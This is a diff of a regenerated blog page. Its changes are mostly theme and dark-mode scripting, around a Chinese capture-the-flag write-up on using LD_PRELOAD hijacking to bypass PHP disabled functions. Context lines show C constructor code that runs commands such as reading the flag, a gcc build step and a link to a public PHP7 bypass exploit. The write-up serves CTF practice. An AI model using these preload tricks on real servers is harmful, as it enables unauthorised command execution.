@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en" dir="auto">
+<html lang="en" dir="auto" data-theme="auto">
 
 <head><meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -12,7 +12,7 @@ https://www.cnblogs.com/wfzWebSecuity/p/11213732.html
 https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">
 <meta name="author" content="ch4ser">
 <link rel="canonical" href="https://dragonbox.top/posts/sec-ld-preload%E5%8A%AB%E6%8C%81%E7%B1%BB%E5%9E%8B%E9%A2%98%E7%9B%AE/">
-<link crossorigin="anonymous" href="/assets/css/stylesheet.2211ca3164be7830024f6aad2b3a2e520843a64f8f048445c3401c1249aa051d.css" integrity="sha256-IhHKMWS&#43;eDACT2qtKzouUghDpk&#43;PBIRFw0AcEkmqBR0=" rel="preload stylesheet" as="style">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.da3211e5ef867bf2b75fd5a6515cfed7195c011e8ab735694e203810a827097b.css" integrity="sha256-2jIR5e&#43;Ge/K3X9WmUVz&#43;1xlcAR6KtzVpTiA4EKgnCXs=" rel="preload stylesheet" as="style">
 <link rel="icon" href="https://dragonbox.top/flash.ico">
 <link rel="icon" type="image/png" sizes="16x16" href="https://dragonbox.top/flash.ico">
 <link rel="icon" type="image/png" sizes="32x32" href="https://dragonbox.top/flash.ico">
@@ -41,23 +41,38 @@ https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">
                 --code-block-bg: rgb(46, 46, 51);
                 --code-bg: rgb(55, 56, 62);
                 --border: rgb(51, 51, 51);
+                color-scheme: dark;
             }
 
             .list {
                 background: var(--theme);
             }
 
-            .list:not(.dark)::-webkit-scrollbar-track {
-                background: 0 0;
+            .toc {
+                background: var(--entry);
             }
+        }
 
-            .list:not(.dark)::-webkit-scrollbar-thumb {
-                border-color: var(--theme);
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
             }
         }
 
     </style>
-</noscript><meta property="og:url" content="https://dragonbox.top/posts/sec-ld-preload%E5%8A%AB%E6%8C%81%E7%B1%BB%E5%9E%8B%E9%A2%98%E7%9B%AE/">
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="https://dragonbox.top/posts/sec-ld-preload%E5%8A%AB%E6%8C%81%E7%B1%BB%E5%9E%8B%E9%A2%98%E7%9B%AE/">
   <meta property="og:site_name" content="ch4ser の 超元域">
   <meta property="og:title" content="LD_PRELOAD劫持类型题目">
   <meta property="og:description" content="贴几个参考链接
@@ -129,20 +144,8 @@ https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">
 }
 </script>
 </head>
-
-<body class="" id="top">
-<script>
-    if (localStorage.getItem("pref-theme") === "dark") {
-        document.body.classList.add('dark');
-    } else if (localStorage.getItem("pref-theme") === "light") {
-        document.body.classList.remove('dark')
-    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
-        document.body.classList.add('dark');
-    }
-
-</script>
-
-<header class="header">
+<body id="top">
+    <header class="header">
     <nav class="nav">
         <div class="logo">
             <a href="https://dragonbox.top/" accesskey="h" title="ch4ser の 超元域 (Alt + H)">
@@ -178,6 +181,11 @@ https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">
                 </a>
             </li>
             <li>
+                <a href="https://dragonbox.top/friends/" title="friends">
+                    <span>friends</span>
+                </a>
+            </li>
+            <li>
                 <a href="https://dragonbox.top/about/" title="about">
                     <span>about</span>
                 </a>
@@ -193,7 +201,7 @@ https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">
     <h1 class="post-title entry-hint-parent">
       LD_PRELOAD劫持类型题目
     </h1>
-    <div class="post-meta"><span title='2019-12-26 16:37:19 +0000 UTC'>December 26, 2019</span>&nbsp;·&nbsp;3 min&nbsp;·&nbsp;435 words&nbsp;·&nbsp;ch4ser
+    <div class="post-meta"><span title='2019-12-26 16:37:19 +0000 UTC'>December 26, 2019</span>&nbsp;·&nbsp;<span>3 min</span>&nbsp;·&nbsp;<span>435 words</span>&nbsp;·&nbsp;<span>ch4ser</span>
 
 </div>
   </header> <div class="toc">
@@ -281,7 +289,7 @@ replace=phpinfo();
 </span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
 </span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp">
 </span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;signal.h&gt;</span><span class="cp">
-</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">pwn</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl"><span class="nf">system</span><span class="p">(</span><span class="s">&#34;perl /var/www/html/exp.perl &gt; /var/www/html/res 2&gt;&amp;1&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
@@ -323,7 +331,7 @@ replace=phpinfo();
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
 </span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
 </span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
-</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="nf">__attribute__</span> <span class="p">((</span><span class="n">__constructor__</span><span class="p">))</span> <span class="kt">void</span> <span class="nf">angel</span> <span class="p">(</span><span class="kt">void</span><span class="p">){</span>
 </span></span><span class="line"><span class="cl">    <span class="nf">unsetenv</span><span class="p">(</span><span class="s">&#34;LD_PRELOAD&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="nf">system</span><span class="p">(</span><span class="s">&#34;/readflag &gt; /tmp/ch4ser&#34;</span><span class="p">);</span>
@@ -382,16 +390,18 @@ replace=phpinfo();
 <p>然后服务器上面的<code>hack.c</code>文件如下：</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
 </span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
-</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="nf">__attribute__</span> <span class="p">((</span><span class="n">__constructor__</span><span class="p">))</span> <span class="kt">void</span> <span class="nf">angel</span> <span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+</span></span></span><span class="line"><span class="cl"><span class="nf">__attribute__</span> <span class="p">((</span><span class="n">__constructor__</span><span class="p">))</span> <span class="kt">void</span> <span class="nf">angel</span> <span class="p">(</span><span class="kt">void</span><span class="p">){</span>
 </span></span><span class="line"><span class="cl">    <span class="nf">system</span><span class="p">(</span><span class="s">&#34;/readflag &gt; /tmp/ch4ser&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><p>使用命令<code>gcc --share -fPIC hack.c -o hack.so</code>命令来编译共享文件。在服务器目录下面开启<code>python -m SimpleHTTPServer 80</code>，并运行上述python脚本，即可看到flag。</p>
 <p><img alt="image-20211114141817095" loading="lazy" src="/posts/sec-ld-preload%E5%8A%AB%E6%8C%81%E7%B1%BB%E5%9E%8B%E9%A2%98%E7%9B%AE/image-20211114141817095.png"></p>
 <blockquote>
-<p>ps:每个人的目录会不定时被服务器清空</p></blockquote>
+<p>ps:每个人的目录会不定时被服务器清空</p>
+</blockquote>
 <blockquote>
 <p>如果LD_PRELOAD不行可以考虑上通杀马</p>
-<p><a href="https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php">https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php</a></p></blockquote>
+<p><a href="https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php">https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php</a></p>
+</blockquote>
 
   </div>
 
@@ -416,7 +426,7 @@ replace=phpinfo();
     </main>
     
 <footer class="footer">
-        <span>&copy; 2025 <a href="https://dragonbox.top/">ch4ser の 超元域</a></span> · 
+        <span>&copy; 2026 <a href="https://dragonbox.top/">ch4ser の 超元域</a></span> · 
 
     <span>
         Powered by
@@ -431,9 +441,14 @@ replace=phpinfo();
 </a>
 
 <script>
-    let menu = document.getElementById('menu')
+    let menu = document.getElementById('menu');
     if (menu) {
-        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
         menu.onscroll = function () {
             localStorage.setItem("menu-scroll-position", menu.scrollLeft);
         }
@@ -474,11 +489,12 @@ replace=phpinfo();
 </script>
 <script>
     document.getElementById("theme-toggle").addEventListener("click", () => {
-        if (document.body.className.includes("dark")) {
-            document.body.classList.remove('dark');
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
             localStorage.setItem("pref-theme", 'light');
         } else {
-            document.body.classList.add('dark');
+            html.dataset.theme = 'dark';
             localStorage.setItem("pref-theme", 'dark');
         }
     })
